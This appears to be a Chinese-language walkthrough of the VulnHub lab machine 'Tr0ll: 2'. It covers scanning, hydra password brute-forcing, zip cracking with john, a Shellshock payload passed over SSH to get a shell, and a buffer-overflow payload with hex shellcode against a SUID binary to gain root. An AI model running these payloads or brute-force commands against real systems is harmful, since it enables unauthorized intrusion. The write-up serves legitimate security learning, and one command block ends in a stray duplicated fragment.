# Tr0ll: 2

https://www.vulnhub.com/entry/tr0ll-2,107/

difficulty: Beginner

Finish Date：2024-4-13

## IP

192.168.10.160

## Scan

Open Port -> 21,22,80

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 82fe93b8fb38a677b5a625786b35e2a8 (DSA)
|   2048 7da599b8fb6765c96486aa2cd6ca085d (RSA)
|_  256 91b86a45be41fdc814b502a0667c8c96 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
```

ftp 不允许匿名登陆，banner 提示为：Welcome to Tr0ll FTP... Only noobs stay for a while...，但是目前也没有用户名和密码，猜测几个账号试试能否登陆进去。

在看看 80 上有什么东西，首页源代码中发现了一个注释：Author: Tr0ll，其他没什么有用信息。

对 web 服务进行目录扫描，http://192.168.10.160/robots.txt 下发现了提示信息：

```
User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
```

将这些文件保存到 txt 中再次进行目录扫描，看看哪些目录是存在的：

```
/noob                 (Status: 301) [Size: 315] [--> http://192.168.10.160/noob/]
/keep_trying          (Status: 301) [Size: 322] [--> http://192.168.10.160/keep_trying/]
/dont_bother          (Status: 301) [Size: 322] [--> http://192.168.10.160/dont_bother/]
/ok_this_is_it        (Status: 301) [Size: 324] [--> http://192.168.10.160/ok_this_is_it/]
```

访问他们，都显示的是一个图片，图片的名字有意思：cat_the_troll.jpg，提示图片中可能有隐藏信息，依次把上面四个连接中的图片下载下来，然后用 strings 进行查看，最终在 /dont_bother/ 这个目录的图片最后一行发现了提示：Look Deep within y0ur_self for the answer

查看目录：http://192.168.10.160/y0ur_self 有一个 answer.txt 文件，里面显示的是一个列表，但是里面有好多重复的内容，让我们对这个内容处理下，去掉重复的内容，看看剩下的有什么：

```
sort -u answer.txt > u.txt
base64 -d u.txt > file.txt
```

最终 fineile.txt 中的内容，像是密码字典。目前我们只有 2 个服务能访问 ftp 和 ssh，但是都没有现成的用户名和密码，前面发现的 Author: Tr0ll，这个 Tr0ll 可能是一个用户名，让我们用发现的密码字典去尝试爆破：

```
hydra -t 20 -l Tr0ll -P file.txt ftp://192.168.10.160
hydra -t 20 -l Tr0ll -P file.txt ssh://192.168.10.160
```

但是上面两个爆破都没成功，在想想，有时候管理员可能把用户名和密码都设置成一样的，再次尝试都使用 Tr0ll:Tr0ll 登陆 ftp 成功。

进入 ftp 后发现文件 lmao.zip，将其下载到 kali 上。查看压缩包，但是压缩包加了密，密码的话有没有可能存在上面我们找到的密码字典中，进一步进行尝试，使用 john 将 zip 转换成符合的格式，然后进行爆破：

```
zip2john lmao.zip > lmao
john --wordlist=./file.txt lmao
```

得到解压密码：ItCantReallyBeThisEasyRightLOL，解压后得到了一个私钥文件，很有可能是登陆 ssh 的，但是我们不知道 ssh 用户名，从前面收集的信息来和结合这个文件名来看，有可能是：Tr0ll、lmao、noob，依次进行尝试登陆。Tr0ll、lmao 这两个都不能登陆，只有 noob 能登陆，但是登陆后立马就被断开连接了。

```
ssh -i id_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa noob@192.168.10.160
TRY HARDER LOL!
Connection to 192.168.10.160 closed.
```

这里整不会了，去搜索一些资料看看怎么能进行连接。发现有 Shellshock 漏洞，利用下面的代码，最终获得了 bash 执行权限：

```
ssh -i id_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa noob@192.168.10.160 -v  查看一下ssh连接的详细信息，注意到有：debug1: Remote: Forced command.

ssh -i id_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa noob@192.168.10.160 '() { :;}; echo Shellshock'  先用此命令进行漏洞复现，最后打印出：Shellshock

ssh -i id_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa noob@192.168.10.160 '() { :;}; /bin/bash'
python -c 'import pty; pty.spawn("/bin/bash")'
```

上传 linpeas.sh 进行系统枚举，发现了几个非系统的 SUID 文件：

```
-rwsr-xr-x 1 root root 8.3K Oct  5  2014 /nothing_to_see_here/choose_wisely/door2/r00t (Unknown SUID binary!)
-rwsr-xr-x 1 root root 7.2K Oct  5  2014 /nothing_to_see_here/choose_wisely/door3/r00t (Unknown SUID binary!)
-rwsr-xr-x 1 root root 7.2K Oct  5  2014 /nothing_to_see_here/choose_wisely/door1/r00t (Unknown SUID binary!)
```

在.bash_history 中找到了这些操作，看上去好像能造成缓冲区溢出：

```
cat .bash_history
./bof
./bof @@@@@@@@@@@@
gdb bof
rm bof
ls -al
rm .bash_history
su root
```

door1 和 door3 中的程序执行后，不是断开 ssh 连接，就是禁用了 ls 命令。door2 中对应的 r00t 可提供输入内容，可能存在缓冲区溢出漏洞，对缓冲区溢出攻击不熟悉，找了一些 payload 完成了提升至 root 权限。

```
./r00t env - ./r00t $(python -c 'print "A" * 268 + "\x80\xfc\xff\xbf" + "\x90" * 16 + "\xdb\xd6\xb8\xac\x61\x13\xf8\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0b\x31\x45\x1a\x03\x45\x1a\x83\xc5\x04\xe2\x59\x0b\x18\xa0\x38\x9e\x78\x38\x17\x7c\x0c\x5f\x0f\xad\x7d\xc8\xcf\xd9\xae\x6a\xa6\x77\x38\x89\x6a\x60\x32\x4e\x8a\x70\x6c\x2c\xe3\x1e\x5d\xc3\x9b\xde\xf6\x70\xd2\x3e\x35\xf6"')
<c\xe3\x1e\x5d\xc3\x9b\xde\xf6\x70\xd2\x3e\x35\xf6"')
```

最后得到了 root 权限：

```
# cat Proof.txt
cat Proof.txt
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
```
